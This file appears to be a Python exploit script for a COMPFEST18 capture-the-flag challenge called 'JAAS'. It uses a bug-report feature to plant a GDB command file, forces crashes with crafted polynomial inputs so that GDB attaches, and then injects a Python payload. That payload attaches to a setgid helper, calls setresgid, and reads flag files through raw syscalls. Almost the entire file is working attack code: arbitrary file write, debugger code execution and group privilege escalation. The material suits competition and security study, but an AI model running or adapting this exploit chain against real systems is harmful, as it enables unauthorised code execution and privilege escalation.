#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import re
import socket
import sys
import time
from typing import Optional, Iterable, Tuple

DEFAULT_HOST = os.environ.get("HOST", "127.0.0.1")
DEFAULT_PORT = int(os.environ.get("PORT", "8080"))
DEFAULT_TOKEN = os.environ.get("CTFD_TOKEN")
DEFAULT_TIMEOUT = float(os.environ.get("TIMEOUT", "180"))

GDB_CMD_PATH = "/home/ctf/.jaas.gdb"

# Try known crash first, then small targeted candidates.
TRIGGERS = [
    (11, "x-x+y-y+3"),
    (2, "x-x+y-y+1"),
    (3, "x-x+y-y+1"),
    (5, "x-x+y-y+3"),
    (11, "x^2+y^2"),
    (2, "x^2+y^2"),
    (3, "x^3+y^3"),
    (11, "x^3+y^3"),
    (11, "x^2*y+x*y^2"),
    (2, "x^2*y+x*y^2"),
    (11, "x^4+y^4+1"),
    (3, "x^4+y^4+1"),
    (11, "y^2-x^5-x^3-x-1"),
    (5, "y^2-x^5-x^3-x-1"),
    (11, "x^5+y^5+1"),
]

FLAG_RES = [
    re.compile(rb"COMPFEST18\{[^}\r\n]{1,500}\}"),
    re.compile(rb"[A-Za-z0-9_\-]{2,100}\{[^}\r\n]{1,500}\}"),
]

GDB_PY = 'import gdb, os, subprocess, time, signal, traceback, re\n\nPATHS = ("/home/ctf/flag.txt", "/flag.txt", "./flag.txt")\n\ndef O(s):\n    try:\n        gdb.write(str(s) + "\\n", gdb.STDOUT)\n    except Exception:\n        try:\n            print(str(s), flush=True)\n        except Exception:\n            pass\n\ndef X(cmd, to_string=False):\n    return gdb.execute(cmd, to_string=to_string)\n\ndef E(expr):\n    return int(gdb.parse_and_eval(expr))\n\ndef read_status(pid):\n    txt = open("/proc/%d/status" % pid, "r").read()\n    m = re.search(r"^State:\\s+(.+)$", txt, re.M)\n    g = re.search(r"^Gid:\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)", txt, re.M)\n    return (m.group(1) if m else "", int(g.group(2)) if g else None)\n\ndef wait_stopped(pid):\n    state, egid = "", None\n    for _ in range(300):\n        try:\n            state, egid = read_status(pid)\n            if egid is not None and state.startswith("T"):\n                break\n        except Exception:\n            pass\n        time.sleep(0.05)\n    return state, egid\n\ntry:\n    O("__JAAS_SOURCE_START__")\n    try:\n        X("set confirm off")\n        X("set pagination off")\n        X("set verbose off")\n        X("set print thread-events off")\n    except Exception:\n        pass\n\n    try:\n        X("detach")\n        O("__JAAS_DETACHED_CRASHED__")\n    except Exception as e:\n        O("__JAAS_DETACH_SKIP__=%r" % (e,))\n\n    p = subprocess.Popen(["/home/ctf/tes"])\n    O("__JAAS_HELPER_PID__=%d" % p.pid)\n\n    state, egid = wait_stopped(p.pid)\n    O("__JAAS_HELPER_STATE__=%s" % state)\n    O("__JAAS_HELPER_EGID__=%s" % egid)\n    if egid is None:\n        raise RuntimeError("helper egid missing")\n\n    try:\n        os.kill(p.pid, signal.SIGCONT)\n        O("__JAAS_HELPER_SIGCONT__")\n    except Exception as e:\n        O("__JAAS_SIGCONT_FAIL__=%r" % (e,))\n\n    time.sleep(0.25)\n    X("attach %d" % p.pid)\n    O("__JAAS_ATTACHED_HELPER__")\n\n    try:\n        X("call (long)syscall(119,%d,%d,%d)" % (egid, egid, egid))\n        O("__JAAS_SETRESGID_DONE__")\n    except Exception as e:\n        O("__JAAS_SETRESGID_SKIP__=%r" % (e,))\n\n    try:\n        X("set $buf=(char*)malloc(4096)")\n    except Exception:\n        X("set $buf=(char*)calloc(1,4096)")\n\n    for path in PATHS:\n        O("__JAAS_TRY_PATH__=%s" % path)\n        try:\n            X("set $fd=(long)syscall(257,-100,\\"%s\\",0,0)" % path)\n        except Exception as e:\n            O("__JAAS_OPENAT_FAIL__=%r" % (e,))\n            try:\n                X("set $fd=(int)open(\\"%s\\",0)" % path)\n            except Exception as e2:\n                O("__JAAS_OPEN_FAIL__=%r" % (e2,))\n                continue\n\n        try:\n            fd = E("$fd")\n        except Exception:\n            fd = -1\n        O("__JAAS_FD__=%d" % fd)\n        if fd < 0:\n            continue\n\n        try:\n            X("set $n=(long)syscall(0,$fd,$buf,4095)")\n        except Exception as e:\n            O("__JAAS_READ_SYSCALL_FAIL__=%r" % (e,))\n            try:\n                X("set $n=(long)read($fd,$buf,4095)")\n            except Exception as e2:\n                O("__JAAS_READ_FAIL__=%r" % (e2,))\n                continue\n\n        try:\n            n = E("$n")\n        except Exception:\n            n = -1\n        O("__JAAS_N__=%d" % n)\n\n        if n > 0:\n            try:\n                X("call (long)syscall(1,1,$buf,$n)")\n            except Exception as e:\n                O("__JAAS_WRITE_SYSCALL_FAIL__=%r" % (e,))\n                try:\n                    X("call (long)write(1,$buf,$n)")\n                except Exception:\n                    X("x/s $buf")\n            break\n\n    O("__JAAS_SOURCE_END__")\nexcept BaseException:\n    O("__JAAS_SOURCE_ERROR__")\n    traceback.print_exc()\nfinally:\n    try:\n        X("quit")\n    except Exception:\n        pass'

def flag_from(data: bytes) -> Optional[bytes]:
    for rx in FLAG_RES:
        m = rx.search(data)
        if m:
            return m.group(0)
    return None

def recv_until_any(sock: socket.socket, needles: Iterable[bytes], timeout: float) -> Tuple[bytes, Optional[bytes]]:
    needles = tuple(needles)
    data = bytearray()
    sock.settimeout(0.25)
    deadline = time.time() + timeout
    while time.time() < deadline:
        for n in needles:
            if n in data:
                return bytes(data), n
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue
        if not chunk:
            return bytes(data), None
        data += chunk
        if flag_from(data):
            return bytes(data), b"FLAG"
    return bytes(data), None

def recv_quiet(sock: socket.socket, timeout: float, quiet_after: float = 1.5) -> bytes:
    data = bytearray()
    deadline = time.time() + timeout
    last = time.time()
    sock.settimeout(0.25)
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            if data and time.time() - last >= quiet_after:
                break
            continue
        if not chunk:
            break
        data += chunk
        last = time.time()
        if flag_from(data):
            # still allow a bit more output around the flag
            quiet_after = min(quiet_after, 0.5)
    return bytes(data)

def connect(host: str, port: int, timeout: float, token: Optional[str], dbg: Optional[bytearray] = None) -> socket.socket:
    s = socket.create_connection((host, port), timeout=timeout)
    if token:
        out, hit = recv_until_any(s, [b"CTFd access token:", b"token:", b": "], timeout)
        if dbg is not None:
            dbg += b"[local] token prompt hit=" + repr(hit).encode() + b"\n" + out
        if hit is None or b"token" not in out.lower():
            s.close()
            raise RuntimeError(f"token prompt not seen; hit={hit!r}; out={out[-500:]!r}")
        s.sendall(token.encode() + b"\n")
    return s

def wait_menu(s: socket.socket, timeout: float) -> bytes:
    out, hit = recv_until_any(s, [b"> ", b"__JAAS_", b"COMPFEST18{"], timeout)
    if hit in (b"__JAAS_", b"COMPFEST18{"):
        return out
    if b"> " not in out:
        raise RuntimeError(f"menu not reached; tail={out[-800:]!r}")
    return out

def write_file(host: str, port: int, timeout: float, token: Optional[str], path: str, content: str) -> bytes:
    dbg = bytearray()
    with connect(host, port, timeout, token, dbg) as s:
        out = bytearray(dbg)
        out += wait_menu(s, timeout)
        if b"__JAAS_" in out or flag_from(out):
            return bytes(out)
        s.sendall(b"2\n")
        out += recv_until_any(s, [b"bug name: "], timeout)[0]
        s.sendall(path.encode() + b"\n")
        out += recv_until_any(s, [b"description: "], timeout)[0]
        if "\n" in content or "\r" in content:
            raise ValueError("content must be one physical line")
        try:
            s.sendall(content.encode() + b"\n")
        except BrokenPipeError:
            out += b"\n[local] BrokenPipe while sending content\n"
            return bytes(out)
        out += recv_quiet(s, min(timeout, 8.0), quiet_after=0.8)
        return bytes(out)

def plant_gdb_command(host: str, port: int, timeout: float, token: Optional[str], path: str) -> bytes:
    # Single physical line, because chall.py uses input() for description.
    line = "python exec(" + repr(GDB_PY) + ")"
    print(f"[*] writing GDB command file: {path}")
    out = write_file(host, port, timeout, token, path, line)
    if b"report saved" not in out:
        raise RuntimeError(f"failed writing {path}; tail={out[-800:]!r}")
    return out


def recv_short(sock: socket.socket, seconds: float) -> bytes:
    data = bytearray()
    end = time.time() + max(0.0, seconds)
    sock.settimeout(0.15)
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue
        if not chunk:
            break
        data += chunk
        if flag_from(data) or b"__JAAS_" in data:
            break
    return bytes(data)

def drive_gdb_prompt(sock: socket.socket, out: bytearray, timeout: float, gdb_delay: float, source_path: str, source_retries: int, direct_fallback: bool) -> None:
    """
    cysignals sometimes prints 'Attaching gdb...' before GDB is ready to accept
    commands. This routine waits for any prompt text, pokes the PTY with Ctrl-C /
    Enter, then tries both `source <file>` and a direct one-line Python command.
    It mutates `out` by appending everything received.
    """
    # Let GDB finish attaching, but keep reading because the prompt may arrive late.
    out += recv_short(sock, gdb_delay)

    source_cmds = [
        (b"\\n", ("source " + source_path + "\\n").encode()),
        (b"\\x03\\n", ("source " + source_path + "\\n").encode()),
        (b"\\r", ("source " + source_path + "\\r").encode()),
        (b"\\x03\\r", ("source " + source_path + "\\r").encode()),
    ]
    direct_cmd = ("python exec(" + repr(GDB_PY) + ")\\n").encode()

    attempts = []
    for i in range(max(1, source_retries)):
        attempts.append(source_cmds[i % len(source_cmds)])
    if direct_fallback:
        attempts.append((b"\\x03\\n", direct_cmd))
        attempts.append((b"\\n", direct_cmd))

    for idx, (prefix, cmd) in enumerate(attempts, 1):
        out += ("\n[local] GDB drive attempt %d/%d\n" % (idx, len(attempts))).encode()
        try:
            # Send prefix and command separately. Some PTYs drop/line-buffer a big send
            # while GDB is still installing signal handlers.
            if prefix:
                sock.sendall(prefix)
                time.sleep(0.35)
            sock.sendall(cmd)
        except BrokenPipeError:
            out += b"\n[local] BrokenPipe while driving GDB\n"
            return

        chunk, hit2 = recv_until_any(
            sock,
            [
                b"__JAAS_SOURCE_START__",
                b"__JAAS_SOURCE_ERROR__",
                b"COMPFEST18{",
                b"(gdb)",
                b"Undefined command",
                b"No such file",
                b"Python Exception",
                b"Error in sourced command file",
            ],
            min(timeout, 12.0),
        )
        out += chunk
        if flag_from(out) or b"__JAAS_SOURCE_START__" in out or b"__JAAS_SOURCE_ERROR__" in out:
            out += recv_quiet(sock, timeout, quiet_after=2.0)
            return

    # Final drain for late GDB output.
    out += recv_quiet(sock, timeout, quiet_after=2.0)

def trigger_once(host: str, port: int, timeout: float, token: Optional[str], p: int, expr: str, gdb_delay: float, source_path: str, source_retries: int, direct_fallback: bool) -> bytes:
    dbg = bytearray()
    with connect(host, port, timeout, token, dbg) as s:
        out = bytearray(dbg)
        out += wait_menu(s, timeout)
        if b"__JAAS_" in out or flag_from(out):
            out += recv_quiet(s, timeout, quiet_after=1.0)
            return bytes(out)

        s.sendall(b"1\n")
        out += recv_until_any(s, [b"Enter a prime number p: "], timeout)[0]
        s.sendall(str(p).encode() + b"\n")
        out += recv_until_any(s, [b"Enter a polynomial expression : "], timeout)[0]
        s.sendall(expr.encode() + b"\n")

        first, hit = recv_until_any(
            s,
            [b"Attaching gdb to process id", b"(gdb)", b"__JAAS_", b"COMPFEST18{", b"Something went wrong."],
            timeout,
        )
        out += first

        if flag_from(out) or b"__JAAS_" in out:
            out += recv_quiet(s, timeout, quiet_after=1.0)
            return bytes(out)

        if hit in (b"Attaching gdb to process id", b"(gdb)"):
            print(f"[+] GDB marker seen for p={p}, expr={expr!r}; syncing prompt + sourcing payload")
            drive_gdb_prompt(s, out, timeout, gdb_delay, source_path, source_retries, direct_fallback)
            return bytes(out)

        return bytes(out)

def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="JAAS solver ctrl-c sync: write GDB command file, trigger cysignals, then force source/direct payload")
    ap.add_argument("host", nargs="?", default=DEFAULT_HOST)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    ap.add_argument("token", nargs="?", default=DEFAULT_TOKEN)
    ap.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    ap.add_argument("--attempt-timeout", type=float, default=25.0)
    ap.add_argument("--gdb-delay", type=float, default=6.0)
    ap.add_argument("--source-path", default=GDB_CMD_PATH)
    ap.add_argument("--source-retries", type=int, default=4)
    ap.add_argument("--no-direct-fallback", action="store_true")
    ap.add_argument("--trigger-only", action="store_true")
    ap.add_argument("--debug-output", action="store_true")
    ap.add_argument("--expr", action="append", default=[], help="extra trigger expression; can repeat")
    ap.add_argument("--p", action="append", type=int, default=[], help="extra prime for --expr; can repeat")
    return ap.parse_args()

def main() -> None:
    args = parse_args()

    print(f"[*] target: {args.host}:{args.port}")
    print(f"[*] CTFd token mode: {'enabled' if args.token else 'disabled/local'}")
    print("[*] strategy: bug-report write -> GDB command file -> cysignals Ctrl-C sync -> source/direct")
    print(f"[*] GDB payload length: {len(GDB_PY)} bytes")

    debug = bytearray()
    try:
        if not args.trigger_only:
            debug += b"\n===== WRITE GDB COMMAND =====\n"
            debug += plant_gdb_command(args.host, args.port, args.timeout, args.token, args.source_path)

        triggers = list(TRIGGERS)
        if args.expr:
            ps = args.p or [11]
            for e in args.expr:
                for p in ps:
                    triggers.insert(0, (p, e))

        for i, (p, expr) in enumerate(triggers, 1):
            print(f"[*] trigger {i}/{len(triggers)}: p={p}, expr={expr!r}")
            out = trigger_once(
                args.host,
                args.port,
                min(args.timeout, args.attempt_timeout),
                args.token,
                p,
                expr,
                args.gdb_delay,
                args.source_path,
                args.source_retries,
                not args.no_direct_fallback,
            )
            debug += b"\n===== TRIGGER p=" + str(p).encode() + b" expr=" + repr(expr).encode() + b" =====\n"
            debug += out

            flag = flag_from(out)
            if flag:
                text = flag.decode(errors="replace")
                print(f"[+] flag: {text}")
                print(f"<FLAG>{text}</FLAG>")
                return

            if b"__JAAS_SOURCE_START__" in out:
                print("[*] GDB payload ran, stopping trigger loop")
                break

    except Exception as e:
        print(f"[-] {type(e).__name__}: {e}", file=sys.stderr)
        if debug:
            sys.stderr.write(debug.decode(errors="replace"))
        sys.exit(1)

    flag = flag_from(debug)
    if flag:
        text = flag.decode(errors="replace")
        print(f"[+] flag: {text}")
        print(f"<FLAG>{text}</FLAG>")
        return

    print("[-] flag not found", file=sys.stderr)
    runtime = bytes(debug).split(b"===== TRIGGER", 1)[-1]
    if b"Attaching gdb to process id" not in runtime and b"(gdb)" not in runtime and b"__JAAS_SOURCE_START__" not in runtime:
        print("[-] belum ada trigger yang memunculkan cysignals/GDB. Coba tambah --attempt-timeout 60 atau kirim output tail.", file=sys.stderr)
    elif b"__JAAS_SOURCE_START__" not in runtime:
        print("[-] GDB muncul, tapi command 'source' belum terlihat jalan. Coba --gdb-delay 5.", file=sys.stderr)
    elif b"__JAAS_ATTACHED_HELPER__" not in runtime:
        print("[-] payload GDB jalan, tapi attach helper gagal. Cek debug mentah.", file=sys.stderr)
    elif b"__JAAS_N__=" in runtime:
        print("[-] helper open/read sudah jalan, tapi regex flag tidak match. Cek nilai FD/N dan output mentah.", file=sys.stderr)

    dump = bytes(debug) if args.debug_output else bytes(debug[-16000:])
    sys.stderr.write("\n===== FULL OUTPUT =====\n" if args.debug_output else "\n===== OUTPUT TAIL =====\n")
    sys.stderr.write(dump.decode(errors="replace"))
    sys.stderr.write("\n===== END OUTPUT =====\n")
    sys.exit(1)

if __name__ == "__main__":
    main()
